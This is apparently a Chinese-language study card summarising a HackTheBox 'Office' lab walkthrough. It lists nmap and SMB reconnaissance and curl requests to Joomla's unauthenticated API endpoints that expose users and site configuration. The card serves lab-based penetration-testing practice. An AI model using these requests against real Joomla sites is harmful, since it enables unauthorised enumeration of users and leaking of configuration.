---
title: "HTB Office实战式打靶过程"
category: web
tags: ["HackTheBox Office", "web", "htb", "pentest", "nmap", "smb"]
signals: ["HackTheBox Office 2024", "htb", "pentest", "nmap", "smb", "joomla", "api", "users", "config", "web_unknown", "HTB", "Office", "Joomla", "API"]
difficulty: medium
source: "https://www.ctfiot.com/217000.html"
tools: ["Python", "curl", "nmap"]
origin: des-import
origin_kind: cards
updated: 2026-10-24
---
# HTB Office实战式打靶过程

> 赛事：HackTheBox Office 2024 | 方向：web | 难度：medium | 工具：Python、curl、nmap

## 一句话总结

HTB Office打靶：Joomla API未授权用户枚举

## 攻击链

1. sudo nmap -sC -sT -sV -O -p53,80,88,139,389,443,445,464,593,636,3268,3269,5985,9389
2. echo '10.10.11.3 dc.office.htb office.htb' >> /etc/hosts
3. smbclient -L //10.10.11.3/
4. curl -v http://10.10.11.3/api/index.php/v1/config/application?public=true
5. curl -v http://10.10.11.3/api/index.php/v1/users?public=true
6. Python 脚本: requests + colorama 解析用户信息
7. fetch_users(base_url) + parse_users() + display_users()

## 关键 payload

```
curl -v /api/index.php/v1/users?public=true
```

## 经验教训

Joomla /api/index.php/v1/users?public=true可枚举所有用户

## 标签

htb、pentest、nmap、smb、joomla、api、users、config、colorama

## 参考来源

- https://www.ctfiot.com/217000.html
- 原文件：HTB_Office实战式打靶过程.full.md
